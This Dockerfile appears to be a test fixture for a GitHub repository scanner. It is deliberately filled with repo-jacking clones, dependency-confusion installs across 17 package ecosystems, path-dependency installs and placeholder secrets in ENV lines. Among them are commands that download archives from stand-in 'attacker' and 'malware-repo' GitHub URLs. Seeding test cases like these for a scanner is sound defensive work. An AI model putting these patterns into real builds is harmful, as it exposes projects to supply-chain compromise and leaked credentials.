# Testing file for GitHub repo scanner - Dockerfile vulnerabilities
FROM node:18-alpine

# Repo jacking vulnerabilities - suspicious GitHub repos
RUN git clone https://github.com/nonexistent-org/fake-repo.git /tmp/fake
RUN git clone https://github.com/test-vuln-repo/malicious-package.git /app/malicious

# Dependency confusion vulnerabilities - ALL 17 platforms
# 1. NPM vulnerabilities
RUN npm install --global nonexistent-internal-package@1.0.0
RUN npm install private-company-utils vulnerable-test-package-9999
RUN yarn add internal-api-client@^2.1.0 company-secret-lib

# 2. Python/PyPI vulnerabilities  
RUN pip install internal-python-lib==1.2.3 company-data-processor
RUN pip install --upgrade private-ml-toolkit vulnerable-pypi-test-pkg

# 3. Ruby/RubyGems vulnerabilities
RUN gem install internal_ruby_gem -v 2.0.1
RUN gem install company-secret-auth vulnerable_gems_test

# 4. Maven/Java vulnerabilities
RUN mvn dependency:get -Dartifact=com.company:internal-utils:1.0.0
RUN gradle build --include-build=../private-java-lib

# 5. Go vulnerabilities
RUN go get github.com/company/internal-go-module@v1.2.3
RUN go install company.com/private/secret-tool@latest

# 6. PHP/Composer vulnerabilities
RUN composer require company/internal-php-lib:^1.0
RUN composer install --working-dir=/app/private-php

# 7. Rust/Cargo vulnerabilities
RUN cargo install internal-rust-crate --version 0.1.2
RUN cargo build --manifest-path=/workspace/private-rust/Cargo.toml

# 8. Elixir/Hex vulnerabilities
RUN mix deps.get internal_elixir_package
RUN mix archive.install hex company_secret_mix 1.0.0

# 9. .NET/NuGet vulnerabilities
RUN dotnet add package InternalCompanyUtils --version 1.0.0
RUN nuget install PrivateDataLib -Version 2.1.0

# 10. Dart/Pub vulnerabilities
RUN dart pub add internal_dart_package:^1.0.0
RUN flutter pub get company_flutter_widgets

# 11. Perl/CPAN vulnerabilities
RUN cpan install Internal::Company::Module
RUN perl -MCPAN -e 'install Company::Secret::Utils'

# 12. R/CRAN vulnerabilities
RUN R -e "install.packages('internalRPackage')"
RUN Rscript -e "devtools::install_github('company/private-r-lib')"

# 13. Swift vulnerabilities
RUN swift package update internal-swift-package
RUN swift build --package-path /workspace/private-swift

# 14. Haskell vulnerabilities
RUN cabal install internal-haskell-lib
RUN stack install company-secret-haskell

# 15. Julia vulnerabilities
RUN julia -e 'using Pkg; Pkg.add("InternalJuliaPackage")'
RUN julia --project=/workspace/private-julia -e 'Pkg.instantiate()'

# 16. Conan vulnerabilities
RUN conan install internal-cpp-lib/1.0.0@company/stable
RUN conan create . company/internal-conan-pkg@1.2.3

# 17. Bazel vulnerabilities
RUN bazel build @internal_workspace//package:target
RUN bazel run //company/private:secret_tool

# Workspace/path dependency confusion vulnerabilities - 8 platforms
# NPM workspace paths
RUN npm install file:../internal-packages/secret-lib
RUN yarn add file:../../company-private/auth-module
RUN pnpm add file:./workspace/nonexistent-package

# Python editable installs  
RUN pip install -e ../private-python-libs/internal-auth
RUN pip install --editable /workspace/missing-python-pkg

# Cargo path dependencies
RUN cargo install --path ../rust-workspace/private-crate
RUN cargo build --manifest-path=./missing-workspace/Cargo.toml

# Go local modules
RUN go mod edit -require=../internal-go-modules/auth@v0.0.0
RUN go get ./workspace/nonexistent-go-mod

# Composer path repos
RUN composer require company/lib --prefer-source --repository='{"type":"path","url":"../private-php-libs"}'

# Ruby local gems
RUN bundle add internal_gem --path ../ruby-workspace/missing-gem

# Dart local packages
RUN dart pub add internal_dart --path=../flutter-workspace/nonexistent

# Bazel workspace deps  
RUN bazel build //workspace/missing:target
RUN bazel run @nonexistent_workspace//tools:deploy

# Copy nested config files that contain vulnerabilities (build context testing)
COPY frontend/package.json ./frontend/
COPY backend/requirements.txt ./backend/
COPY api/Gemfile ./api/
COPY services/composer.json ./services/
COPY rust-service/Cargo.toml ./rust-service/
COPY go-service/go.mod ./go-service/
COPY flutter-app/pubspec.yaml ./flutter-app/
COPY bazel-workspace/BUILD ./bazel-workspace/

# Copy entire directories with nested configs
COPY ./frontend-workspace ./frontend-workspace/
COPY ./backend-services ./backend-services/
COPY ./microservices ./microservices/

# Additional repo jacking scenarios
RUN git submodule add https://github.com/fake-org/compromised-submodule.git modules/compromised
RUN wget https://github.com/suspicious-user/malware-repo/archive/main.zip
RUN curl -L https://github.com/attacker/backdoor-package/tarball/master | tar xz

# Environment variables that could leak sensitive info
ENV INTERNAL_API_KEY=sk_test_123456789
ENV COMPANY_SECRET_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx  
ENV DATABASE_URL=postgres://user:pass@internal-db.company.com:5432/secrets

WORKDIR /app
COPY . .
RUN npm ci && npm run build
